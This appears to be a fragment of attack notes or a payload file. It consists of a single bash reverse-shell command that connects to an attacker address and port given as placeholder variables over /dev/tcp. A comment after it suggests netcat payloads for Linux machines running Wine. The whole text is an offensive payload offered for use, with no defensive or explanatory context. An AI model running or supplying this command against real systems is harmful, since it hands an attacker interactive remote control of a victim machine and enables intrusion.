bash -c "bash -i >& /dev/tcp/${ATTACK_IP}/${ATTACK_PORT} 0>&1"

# For linux boxes running wine, consider using nc payloads instead.
